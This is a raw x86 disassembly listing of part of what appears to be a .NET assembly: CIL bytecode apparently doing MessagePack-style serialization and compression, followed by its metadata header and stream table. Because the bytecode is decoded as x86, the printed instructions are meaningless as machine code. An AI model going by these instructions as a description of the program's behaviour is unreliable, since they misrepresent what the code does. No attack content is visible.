  405752:	28 4a 00             	sub    %cl,0x0(%edx)
  405755:	00 0a                	add    %cl,(%edx)
  405757:	28 58 00             	sub    %bl,0x0(%eax)
  40575a:	00 06                	add    %al,(%esi)
  40575c:	0a 02                	or     (%edx),%al
  40575e:	06                   	push   %es
  40575f:	16                   	push   %ss
  405760:	06                   	push   %es
  405761:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405764:	4c                   	dec    %esp
  405765:	00 00                	add    %al,(%eax)
  405767:	0a 02                	or     (%edx),%al
  405769:	03 16                	add    (%esi),%edx
  40576b:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405771:	00 0a                	add    %cl,(%edx)
  405773:	2a 13                	sub    (%ebx),%dl
  405775:	30 04 00             	xor    %al,(%eax,%eax,1)
  405778:	21 00                	and    %eax,(%eax)
  40577a:	00 00                	add    %al,(%eax)
  40577c:	29 00                	sub    %eax,(%eax)
  40577e:	00 11                	add    %dl,(%ecx)
  405780:	02 20                	add    (%eax),%ah
  405782:	cf                   	iret
  405783:	00 00                	add    %al,(%eax)
  405785:	00 6f ee             	add    %ch,-0x12(%edi)
  405788:	00 00                	add    %al,(%eax)
  40578a:	0a 03                	or     (%ebx),%al
  40578c:	28 09                	sub    %cl,(%ecx)
  40578e:	01 00                	add    %eax,(%eax)
  405790:	0a 0a                	or     (%edx),%cl
  405792:	02 06                	add    (%esi),%al
  405794:	28 58 00             	sub    %bl,0x0(%eax)
  405797:	00 06                	add    %al,(%esi)
  405799:	16                   	push   %ss
  40579a:	1e                   	push   %ds
  40579b:	6f                   	outsl  %ds:(%esi),(%dx)
  40579c:	4c                   	dec    %esp
  40579d:	00 00                	add    %al,(%eax)
  40579f:	0a 2a                	or     (%edx),%ch
  4057a1:	00 00                	add    %al,(%eax)
  4057a3:	00 13                	add    %dl,(%ebx)
  4057a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a8:	35 01 00 00 00       	xor    $0x1,%eax
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	16                   	push   %ss
  4057b2:	6a 3f                	push   $0x3f
  4057b4:	96                   	xchg   %eax,%esi
  4057b5:	00 00                	add    %al,(%eax)
  4057b7:	00 03                	add    %al,(%ebx)
  4057b9:	1f                   	pop    %ds
  4057ba:	7f 6a                	jg     0x405826
  4057bc:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057c1:	02 03                	add    (%ebx),%al
  4057c3:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	0a 2a                	or     (%edx),%ch
  4057ca:	03 20                	add    (%eax),%esp
  4057cc:	ff 00                	incl   (%eax)
  4057ce:	00 00                	add    %al,(%eax)
  4057d0:	6a 3d                	push   $0x3d
  4057d2:	14 00                	adc    $0x0,%al
  4057d4:	00 00                	add    %al,(%eax)
  4057d6:	02 20                	add    (%eax),%ah
  4057d8:	cc                   	int3
  4057d9:	00 00                	add    %al,(%eax)
  4057db:	00 6f ee             	add    %ch,-0x12(%edi)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 02                	or     (%edx),%al
  4057e2:	03 d2                	add    %edx,%edx
  4057e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057e5:	ee                   	out    %al,(%dx)
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	0a 2a                	or     (%edx),%ch
  4057ea:	03 20                	add    (%eax),%esp
  4057ec:	ff                   	(bad)
  4057ed:	ff 00                	incl   (%eax)
  4057ef:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057f2:	1b 00                	sbb    (%eax),%eax
  4057f4:	00 00                	add    %al,(%eax)
  4057f6:	02 20                	add    (%eax),%ah
  4057f8:	cd 00                	int    $0x0
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057fd:	ee                   	out    %al,(%dx)
  4057fe:	00 00                	add    %al,(%eax)
  405800:	0a 02                	or     (%edx),%al
  405802:	03 68 28             	add    0x28(%eax),%ebp
  405805:	5b                   	pop    %ebx
  405806:	00 00                	add    %al,(%eax)
  405808:	06                   	push   %es
  405809:	16                   	push   %ss
  40580a:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  40580d:	00 00                	add    %al,(%eax)
  40580f:	0a 2a                	or     (%edx),%ch
  405811:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  405817:	00 00                	add    %al,(%eax)
  405819:	02 20                	add    (%eax),%ah
  40581b:	ce                   	into
  40581c:	00 00                	add    %al,(%eax)
  40581e:	00 6f ee             	add    %ch,-0x12(%edi)
  405821:	00 00                	add    %al,(%eax)
  405823:	0a 02                	or     (%edx),%al
  405825:	03 69 28             	add    0x28(%ecx),%ebp
  405828:	5a                   	pop    %edx
  405829:	00 00                	add    %al,(%eax)
  40582b:	06                   	push   %es
  40582c:	16                   	push   %ss
  40582d:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405830:	00 00                	add    %al,(%eax)
  405832:	0a 2a                	or     (%edx),%ch
  405834:	02 20                	add    (%eax),%ah
  405836:	d3 00                	roll   %cl,(%eax)
  405838:	00 00                	add    %al,(%eax)
  40583a:	6f                   	outsl  %ds:(%esi),(%dx)
  40583b:	ee                   	out    %al,(%dx)
  40583c:	00 00                	add    %al,(%eax)
  40583e:	0a 02                	or     (%edx),%al
  405840:	03 28                	add    (%eax),%ebp
  405842:	59                   	pop    %ecx
  405843:	00 00                	add    %al,(%eax)
  405845:	06                   	push   %es
  405846:	16                   	push   %ss
  405847:	1e                   	push   %ds
  405848:	6f                   	outsl  %ds:(%esi),(%dx)
  405849:	4c                   	dec    %esp
  40584a:	00 00                	add    %al,(%eax)
  40584c:	0a 2a                	or     (%edx),%ch
  40584e:	03 20                	add    (%eax),%esp
  405850:	00 00                	add    %al,(%eax)
  405852:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405858:	00 00                	add    %al,(%eax)
  40585a:	02 20                	add    (%eax),%ah
  40585c:	d3 00                	roll   %cl,(%eax)
  40585e:	00 00                	add    %al,(%eax)
  405860:	6f                   	outsl  %ds:(%esi),(%dx)
  405861:	ee                   	out    %al,(%dx)
  405862:	00 00                	add    %al,(%eax)
  405864:	0a 02                	or     (%edx),%al
  405866:	03 28                	add    (%eax),%ebp
  405868:	59                   	pop    %ecx
  405869:	00 00                	add    %al,(%eax)
  40586b:	06                   	push   %es
  40586c:	16                   	push   %ss
  40586d:	1e                   	push   %ds
  40586e:	6f                   	outsl  %ds:(%esi),(%dx)
  40586f:	4c                   	dec    %esp
  405870:	00 00                	add    %al,(%eax)
  405872:	0a 2a                	or     (%edx),%ch
  405874:	03 20                	add    (%eax),%esp
  405876:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  40587c:	1b 00                	sbb    (%eax),%eax
  40587e:	00 00                	add    %al,(%eax)
  405880:	02 20                	add    (%eax),%ah
  405882:	d2 00                	rolb   %cl,(%eax)
  405884:	00 00                	add    %al,(%eax)
  405886:	6f                   	outsl  %ds:(%esi),(%dx)
  405887:	ee                   	out    %al,(%dx)
  405888:	00 00                	add    %al,(%eax)
  40588a:	0a 02                	or     (%edx),%al
  40588c:	03 69 28             	add    0x28(%ecx),%ebp
  40588f:	5a                   	pop    %edx
  405890:	00 00                	add    %al,(%eax)
  405892:	06                   	push   %es
  405893:	16                   	push   %ss
  405894:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405897:	00 00                	add    %al,(%eax)
  405899:	0a 2a                	or     (%edx),%ch
  40589b:	03 1f                	add    (%edi),%ebx
  40589d:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  4058a1:	00 00                	add    %al,(%eax)
  4058a3:	00 02                	add    %al,(%edx)
  4058a5:	20 d1                	and    %dl,%cl
  4058a7:	00 00                	add    %al,(%eax)
  4058a9:	00 6f ee             	add    %ch,-0x12(%edi)
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	0a 02                	or     (%edx),%al
  4058b0:	03 68 28             	add    0x28(%eax),%ebp
  4058b3:	5b                   	pop    %ebx
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	06                   	push   %es
  4058b7:	16                   	push   %ss
  4058b8:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058bb:	00 00                	add    %al,(%eax)
  4058bd:	0a 2a                	or     (%edx),%ch
  4058bf:	03 1f                	add    (%edi),%ebx
  4058c1:	e0 6a                	loopne 0x40592d
  4058c3:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c8:	02 20                	add    (%eax),%ah
  4058ca:	d0 00                	rolb   $1,(%eax)
  4058cc:	00 00                	add    %al,(%eax)
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 02                	or     (%edx),%al
  4058d4:	03 d2                	add    %edx,%edx
  4058d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058d7:	ee                   	out    %al,(%dx)
  4058d8:	00 00                	add    %al,(%eax)
  4058da:	0a 2a                	or     (%edx),%ch
  4058dc:	02 03                	add    (%ebx),%al
  4058de:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058e1:	00 00                	add    %al,(%eax)
  4058e3:	0a 2a                	or     (%edx),%ch
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 1b                	add    %bl,(%ebx)
  4058e9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058ec:	61                   	popa
  4058ed:	00 00                	add    %al,(%eax)
  4058ef:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058f5:	73 4d                	jae    0x405944
  4058f7:	00 00                	add    %al,(%eax)
  4058f9:	0a 0a                	or     (%edx),%cl
  4058fb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  405901:	0b 06                	or     (%esi),%eax
  405903:	07                   	pop    %es
  405904:	16                   	push   %ss
  405905:	1a 6f 45             	sbb    0x45(%edi),%ch
  405908:	00 00                	add    %al,(%eax)
  40590a:	0a 26                	or     (%esi),%ah
  40590c:	07                   	pop    %es
  40590d:	16                   	push   %ss
  40590e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405912:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405915:	16                   	push   %ss
  405916:	73 0a                	jae    0x405922
  405918:	01 00                	add    %eax,(%eax)
  40591a:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405920:	00 01                	add    %al,(%ecx)
  405922:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405925:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405928:	08 6f 45             	or     %ch,0x45(%edi)
  40592b:	00 00                	add    %al,(%eax)
  40592d:	0a 26                	or     (%esi),%ah
  40592f:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  405932:	05 dd 1a 00 00       	add    $0x1add,%eax
  405937:	00 09                	add    %cl,(%ecx)
  405939:	39 06                	cmp    %eax,(%esi)
  40593b:	00 00                	add    %al,(%eax)
  40593d:	00 09                	add    %cl,(%ecx)
  40593f:	6f                   	outsl  %ds:(%esi),(%dx)
  405940:	33 00                	xor    (%eax),%eax
  405942:	00 0a                	add    %cl,(%edx)
  405944:	dc 06                	faddl  (%esi)
  405946:	39 06                	cmp    %eax,(%esi)
  405948:	00 00                	add    %al,(%eax)
  40594a:	00 06                	add    %al,(%esi)
  40594c:	6f                   	outsl  %ds:(%esi),(%dx)
  40594d:	33 00                	xor    (%eax),%eax
  40594f:	00 0a                	add    %cl,(%edx)
  405951:	dc 11                	fcoml  (%ecx)
  405953:	05 2a 00 00 00       	add    $0x2a,%eax
  405958:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40595b:	00 02                	add    %al,(%edx)
  40595d:	00 28                	add    %ch,(%eax)
  40595f:	00 1c 44             	add    %bl,(%esp,%eax,2)
  405962:	00 0d 00 00 00 00    	add    %cl,0x0
  405968:	02 00                	add    (%eax),%al
  40596a:	07                   	pop    %es
  40596b:	00 4a 51             	add    %cl,0x51(%edx)
  40596e:	00 0d 00 00 00 00    	add    %cl,0x0
  405974:	1b 30                	sbb    (%eax),%esi
  405976:	04 00                	add    $0x0,%al
  405978:	5e                   	pop    %esi
  405979:	00 00                	add    %al,(%eax)
  40597b:	00 2e                	add    %ch,(%esi)
  40597d:	00 00                	add    %al,(%eax)
  40597f:	11 73 d0             	adc    %esi,-0x30(%ebx)
  405982:	00 00                	add    %al,(%eax)
  405984:	0a 0a                	or     (%edx),%cl
  405986:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  40598c:	00 0a                	add    %cl,(%edx)
  40598e:	0b 06                	or     (%esi),%eax
  405990:	07                   	pop    %es
  405991:	16                   	push   %ss
  405992:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405995:	00 00                	add    %al,(%eax)
  405997:	0a 06                	or     (%esi),%al
  405999:	17                   	pop    %ss
  40599a:	73 0a                	jae    0x4059a6
  40599c:	01 00                	add    %eax,(%eax)
  40599e:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4059a1:	02 16                	add    (%esi),%dl
  4059a3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a9:	00 0a                	add    %cl,(%edx)
  4059ab:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059ae:	00 00                	add    %al,(%eax)
  4059b0:	0a dd                	or     %ch,%bl
  4059b2:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059b7:	39 06                	cmp    %eax,(%esi)
  4059b9:	00 00                	add    %al,(%eax)
  4059bb:	00 08                	add    %cl,(%eax)
  4059bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4059be:	33 00                	xor    (%eax),%eax
  4059c0:	00 0a                	add    %cl,(%edx)
  4059c2:	dc 06                	faddl  (%esi)
  4059c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4059c5:	dd 00                	fldl   (%eax)
  4059c7:	00 0a                	add    %cl,(%edx)
  4059c9:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059ce:	00 06                	add    %al,(%esi)
  4059d0:	39 06                	cmp    %eax,(%esi)
  4059d2:	00 00                	add    %al,(%eax)
  4059d4:	00 06                	add    %al,(%esi)
  4059d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4059d7:	33 00                	xor    (%eax),%eax
  4059d9:	00 0a                	add    %cl,(%edx)
  4059db:	dc 09                	fmull  (%ecx)
  4059dd:	2a 00                	sub    (%eax),%al
  4059df:	00 01                	add    %al,(%ecx)
  4059e1:	1c 00                	sbb    $0x0,%al
  4059e3:	00 02                	add    %al,(%edx)
  4059e5:	00 20                	add    %ah,(%eax)
  4059e7:	00 16                	add    %dl,(%esi)
  4059e9:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059f0:	02 00                	add    (%eax),%al
  4059f2:	06                   	push   %es
  4059f3:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059f6:	00 0d 00 00 00 00    	add    %cl,0x0
  4059fc:	42                   	inc    %edx
  4059fd:	53                   	push   %ebx
  4059fe:	4a                   	dec    %edx
  4059ff:	42                   	inc    %edx
  405a00:	01 00                	add    %eax,(%eax)
  405a02:	01 00                	add    %eax,(%eax)
  405a04:	00 00                	add    %al,(%eax)
  405a06:	00 00                	add    %al,(%eax)
  405a08:	0c 00                	or     $0x0,%al
  405a0a:	00 00                	add    %al,(%eax)
  405a0c:	76 34                	jbe    0x405a42
  405a0e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a11:	33 30                	xor    (%eax),%esi
  405a13:	33 31                	xor    (%ecx),%esi
  405a15:	39 00                	cmp    %eax,(%eax)
  405a17:	00 00                	add    %al,(%eax)
  405a19:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a1f:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a26:	00 00                	add    %al,(%eax)
  405a28:	28 1e                	sub    %bl,(%esi)
  405a2a:	00 00                	add    %al,(%eax)
  405a2c:	bc 1d 00 00 23       	mov    $0x2300001d,%esp
  405a31:	53                   	push   %ebx
  405a32:	74 72                	je     0x405aa6
  405a34:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405a3b:	00 e4                	add    %ah,%ah
  405a3d:	3b 00                	cmp    (%eax),%eax
  405a3f:	00 ec                	add    %ch,%ah
  405a41:	27                   	daa
  405a42:	00 00                	add    %al,(%eax)
  405a44:	23 55 53             	and    0x53(%ebp),%edx
  405a47:	00 d0                	add    %dl,%al
  405a49:	63 00                	arpl   %eax,(%eax)
  405a4b:	00 10                	add    %dl,(%eax)
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 23                	add    %ah,(%ebx)
  405a51:	47                   	inc    %edi
  405a52:	55                   	push   %ebp
  405a53:	49                   	dec    %ecx
  405a54:	44                   	inc    %esp
  405a55:	00 00                	add    %al,(%eax)
  405a57:	00 e0                	add    %ah,%al
  405a59:	63 00                	arpl   %eax,(%eax)
  405a5b:	00 40 09             	add    %al,0x9(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	23 42 6c             	and    0x6c(%edx),%eax
  405a63:	6f                   	outsl  %ds:(%esi),(%dx)
  405a64:	62 00                	bound  %eax,(%eax)
  405a66:	00 00                	add    %al,(%eax)
  405a68:	00 00                	add    %al,(%eax)
  405a6a:	00 00                	add    %al,(%eax)
  405a6c:	02 00                	add    (%eax),%al
  405a6e:	00 01                	add    %al,(%ecx)
  405a70:	57                   	push   %edi
  405a71:	9f                   	lahf
  405a72:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a77:	00 00                	add    %al,(%eax)
  405a79:	fa                   	cli
  405a7a:	25 33 00 16 00       	and    $0x160033,%eax
  405a7f:	00 01                	add    %al,(%ecx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a89:	00 00                	add    %al,(%eax)
  405a8b:	00 47 00             	add    %al,0x0(%edi)
  405a8e:	00 00                	add    %al,(%eax)
  405a90:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a95:	00 00                	add    %al,(%eax)
  405a97:	00 02                	add    %al,(%edx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 0a                	add    %cl,(%edx)
  405a9d:	01 00                	add    %eax,(%eax)
  405a9f:	00 13                	add    %dl,(%ebx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 31                	add    %dh,(%ecx)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 02                	add    %al,(%edx)
  405aa9:	00 00                	add    %al,(%eax)
  405aab:	00 2e                	add    %ch,(%esi)
  405aad:	00 00                	add    %al,(%eax)
  405aaf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	13 00                	adc    (%eax),%eax
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	20 00                	and    %al,(%eax)
  405aba:	00 00                	add    %al,(%eax)
  405abc:	04 00                	add    $0x0,%al
  405abe:	00 00                	add    %al,(%eax)
  405ac0:	03 00                	add    (%eax),%eax
  405ac2:	00 00                	add    %al,(%eax)
  405ac4:	06                   	push   %es
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 06                	add    %al,(%esi)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 02                	add    %al,(%edx)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 01                	add    %al,(%ecx)
  405ad1:	00 00                	add    %al,(%eax)
  405ad3:	00 08                	add    %cl,(%eax)
  405ad5:	00 00                	add    %al,(%eax)
  405ad7:	00 04 00             	add    %al,(%eax,%eax,1)
  405ada:	00 00                	add    %al,(%eax)
  405adc:	01 00                	add    %eax,(%eax)
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	f1                   	int1
  405ae3:	0a 01                	or     (%ecx),%al
  405ae5:	00 00                	add    %al,(%eax)
  405ae7:	00 00                	add    %al,(%eax)
  405ae9:	00 06                	add    %al,(%esi)
  405aeb:	00 3b                	add    %bh,(%ebx)
  405aed:	19 f0                	sbb    %esi,%eax
  405aef:	0f 0a                	(bad)
  405af1:	00 8a 00 05 16 0a    	add    %cl,0xa160500(%edx)
  405af7:	00 a1 19 74 18 0a    	add    %ah,0xa187419(%ecx)
  405afd:	00 8b 0f 87 1d 06    	add    %cl,0x61d870f(%ebx)
  405b03:	00 2b                	add    %ch,(%ebx)
  405b05:	14 9a                	adc    $0x9a,%al
  405b07:	0b 06                	or     (%esi),%eax
  405b09:	00 84 08 05 16 0a 00 	add    %al,0xa1605(%eax,%ecx,1)
  405b10:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405b11:	10 05 16 0a 00 10    	adc    %al,0x10000a16
  405b17:	18 87 1d 06 00 fb    	sbb    %al,-0x4fff9e3(%edi)
  405b1d:	19 f0                	sbb    %esi,%eax
  405b1f:	0f 0e                	femms
  405b21:	00 07                	add    %al,(%edi)
  405b23:	12 f1                	adc    %cl,%dh
  405b25:	0b 0e                	or     (%esi),%ecx
  405b27:	00 c6                	add    %al,%dh
  405b29:	18 f1                	sbb    %dh,%cl
  405b2b:	0b 06                	or     (%esi),%eax
  405b2d:	00 40 1c             	add    %al,0x1c(%eax)
  405b30:	9a 0b 06 00 2b 13 e1 	lcall  $0xe113,$0x2b00060b
  405b37:	1b 06                	sbb    (%esi),%eax
  405b39:	00 61 10             	add    %ah,0x10(%ecx)
  405b3c:	f0 0f 0a             	lock (bad)
  405b3f:	00 1c 17             	add    %bl,(%edi,%edx,1)
  405b42:	55                   	push   %ebp
  405b43:	00 06                	add    %al,(%esi)
  405b45:	00 2b                	add    %ch,(%ebx)
  405b47:	00 c8                	add    %cl,%al
  405b49:	02 12                	add    (%edx),%dl
  405b4b:	00 20                	add    %ah,(%eax)
  405b4d:	00 9d 15 12 00 01    	add    %bl,0x1001215(%ebp)
  405b53:	00 f0                	add    %dh,%al
  405b55:	0f 12 00             	movlps (%eax),%xmm0
  405b58:	e0 08                	loopne 0x405b62
  405b5a:	9d                   	popf
  405b5b:	15 06 00 ff 07       	adc    $0x7ff0006,%eax
  405b60:	f0 0f 06             	lock clts
  405b63:	00 e4                	add    %ah,%ah
  405b65:	0b e1                	or     %ecx,%esp
  405b67:	1b 06                	sbb    (%esi),%eax
  405b69:	00 a5 14 ca 17 06    	add    %ah,0x617ca14(%ebp)
  405b6f:	00 a3 05 ca 17 06    	add    %ah,0x617ca05(%ebx)
  405b75:	00 c4                	add    %al,%ah
  405b77:	0f 63 02             	packsswb (%edx),%mm0
  405b7a:	06                   	push   %es
  405b7b:	00 ed                	add    %ch,%ch
  405b7d:	09 9d 15 06 00 5a    	or     %ebx,0x5a000615(%ebp)
  405b83:	0a 9d 15 06 00 0a    	or     0xa000615(%ebp),%bl
  405b89:	09 3f                	or     %edi,(%edi)
  405b8b:	15 6f 00 bd 15       	adc    $0x15bd006f,%eax
  405b90:	00 00                	add    %al,(%eax)
  405b92:	06                   	push   %es
  405b93:	00 32                	add    %dh,(%edx)
  405b95:	09 51 11             	or     %edx,0x11(%ecx)
  405b98:	06                   	push   %es
  405b99:	00 b9 09 51 11 06    	add    %bh,0x6115109(%ecx)
  405b9f:	00 9a 09 51 11 06    	add    %bl,0x6115109(%edx)
  405ba5:	00 41 0a             	add    %al,0xa(%ecx)
  405ba8:	51                   	push   %ecx
  405ba9:	11 06                	adc    %eax,(%esi)
  405bab:	00 0d 0a 51 11 06    	add    %cl,0x611510a
  405bb1:	00 26                	add    %ah,(%esi)
  405bb3:	0a 51 11             	or     0x11(%ecx),%dl
  405bb6:	06                   	push   %es
  405bb7:	00 49 09             	add    %cl,0x9(%ecx)
  405bba:	51                   	push   %ecx
  405bbb:	11 06                	adc    %eax,(%esi)
  405bbd:	00 7d 09             	add    %bh,0x9(%ebp)
  405bc0:	51                   	push   %ecx
  405bc1:	11 06                	adc    %eax,(%esi)
  405bc3:	00 64 09 08          	add    %ah,0x8(%ecx,%ecx,1)
  405bc7:	0c 06                	or     $0x6,%al
  405bc9:	00 1e                	add    %bl,(%esi)
  405bcb:	09 7e 15             	or     %edi,0x15(%esi)
  405bce:	06                   	push   %es
  405bcf:	00 ef                	add    %ch,%bh
  405bd1:	08 9d 15 06 00 d6    	or     %bl,-0x29fff9eb(%ebp)
  405bd7:	09 51 11             	or     %edx,0x11(%ecx)
  405bda:	06                   	push   %es
  405bdb:	00 18                	add    %bl,(%eax)
  405bdd:	03 9a 0b 06 00 9b    	add    -0x64fff9f5(%edx),%ebx
  405be3:	1b f0                	sbb    %eax,%esi
  405be5:	0f 06                	clts
  405be7:	00 93 1a f0 0f 06    	add    %dl,0x60ff01a(%ebx)
  405bed:	00 e8                	add    %ch,%al
  405bef:	0b e1                	or     %ecx,%esp
  405bf1:	1b 0a                	sbb    (%edx),%ecx
  405bf3:	00 cc                	add    %cl,%ah
  405bf5:	1c 05                	sbb    $0x5,%al
  405bf7:	16                   	push   %ss
  405bf8:	06                   	push   %es
  405bf9:	00 1b                	add    %bl,(%ebx)
  405bfb:	10 fa                	adc    %bh,%dl
  405bfd:	1c 06                	sbb    $0x6,%al
  405bff:	00 f9                	add    %bh,%cl
  405c01:	12 fa                	adc    %dl,%bh
  405c03:	1c 06                	sbb    $0x6,%al
  405c05:	00 7b 0b             	add    %bh,0xb(%ebx)
  405c08:	fa                   	cli
  405c09:	1c 06                	sbb    $0x6,%al
  405c0b:	00 f5                	add    %dh,%ch
  405c0d:	11 f0                	adc    %esi,%eax
  405c0f:	0f 0a                	(bad)
  405c11:	00 56 18             	add    %dl,0x18(%esi)
  405c14:	60                   	pusha
  405c15:	19 0a                	sbb    %ecx,(%edx)
  405c17:	00 19                	add    %bl,(%ecx)
  405c19:	1a 60 19             	sbb    0x19(%eax),%ah
  405c1c:	0a 00                	or     (%eax),%al
  405c1e:	a8 0e                	test   $0xe,%al
  405c20:	60                   	pusha
  405c21:	19 0a                	sbb    %ecx,(%edx)
  405c23:	00 20                	add    %ah,(%eax)
  405c25:	1d 74 18 0a 00       	sbb    $0xa1874,%eax
  405c2a:	34 08                	xor    $0x8,%al
  405c2c:	74 18                	je     0x405c46
  405c2e:	0a 00                	or     (%eax),%al
  405c30:	1f                   	pop    %ds
  405c31:	08 74 18 06          	or     %dh,0x6(%eax,%ebx,1)
  405c35:	00 c5                	add    %al,%ch
  405c37:	0c f0                	or     $0xf0,%al
  405c39:	0f 06                	clts
  405c3b:	00 ce                	add    %cl,%dh
  405c3d:	12 f0                	adc    %al,%dh
  405c3f:	0f 06                	clts
  405c41:	00 42 10             	add    %al,0x10(%edx)
  405c44:	f0 0f 0a             	lock (bad)
  405c47:	00 bd 17 60 19 0a    	add    %bh,0xa196017(%ebp)
  405c4d:	00 57 17             	add    %dl,0x17(%edi)
  405c50:	60                   	pusha
  405c51:	19 06                	sbb    %eax,(%esi)
  405c53:	00 dd                	add    %bl,%ch
  405c55:	17                   	pop    %ss
  405c56:	f0 0f 06             	lock clts
  405c59:	00 af 05 f0 0f 0a    	add    %ch,0xa0ff005(%edi)
  405c5f:	00 7d 0f             	add    %bh,0xf(%ebp)
  405c62:	74 18                	je     0x405c7c
  405c64:	0a 00                	or     (%eax),%al
  405c66:	f2 0d 87 1d 0a 00    	repnz or $0xa1d87,%eax
  405c6c:	3a 1b                	cmp    (%ebx),%bl
  405c6e:	60                   	pusha
  405c6f:	19 0a                	sbb    %ecx,(%edx)
  405c71:	00 63 11             	add    %ah,0x11(%ebx)
  405c74:	05 16 0a 00 7b       	add    $0x7b000a16,%eax
  405c79:	17                   	pop    %ss
  405c7a:	32 11                	xor    (%ecx),%dl
  405c7c:	06                   	push   %es
  405c7d:	00 9a 0a f0 0f 06    	add    %bl,0x60ff00a(%edx)
  405c83:	00 16                	add    %dl,(%esi)
  405c85:	0e                   	push   %cs
  405c86:	9a 0b 06 00 e4 0d f0 	lcall  $0xf00d,$0xe400060b
  405c8d:	0f 0a                	(bad)
  405c8f:	00 a1 0d f0 0f 0a    	add    %ah,0xa0ff00d(%ecx)
  405c95:	00 eb                	add    %ch,%bl
  405c97:	07                   	pop    %es
  405c98:	f0 0f 06             	lock clts
  405c9b:	00 8a 14 f0 0f 06    	add    %cl,0x60ff014(%edx)
  405ca1:	00 82 1b 9a 0b 06    	add    %al,0x60b9a1b(%edx)
  405ca7:	00 be 0f 63 02 06    	add    %bh,0x602630f(%esi)
  405cad:	00 10                	add    %dl,(%eax)
  405caf:	15 9a 0b 0a 00       	adc    $0xa0b9a,%eax
  405cb4:	59                   	pop    %ecx
  405cb5:	05 74 18 06 00       	add    $0x61874,%eax
  405cba:	b8 01 f0 0f 06       	mov    $0x60ff001,%eax
  405cbf:	00 1f                	add    %bl,(%edi)
  405cc1:	12 63 02             	adc    0x2(%ebx),%ah
  405cc4:	0a 00                	or     (%eax),%al
  405cc6:	4e                   	dec    %esi
  405cc7:	18 3f                	sbb    %bh,(%edi)
  405cc9:	15 0a 00 61 12       	adc    $0x1261000a,%eax
  405cce:	3f                   	aas
  405ccf:	15 06 00 e9 1c       	adc    $0x1ce90006,%eax
  405cd4:	55                   	push   %ebp
  405cd5:	00 06                	add    %al,(%esi)
  405cd7:	00 6c 14 63          	add    %ch,0x63(%esp,%edx,1)
  405cdb:	02 06                	add    (%esi),%al
  405cdd:	00 64 0d 63          	add    %ah,0x63(%ebp,%ecx,1)
  405ce1:	02 0a                	add    (%edx),%cl
  405ce3:	00 b8 06 3f 15 06    	add    %bh,0x6153f06(%eax)
  405ce9:	00 32                	add    %dh,(%edx)
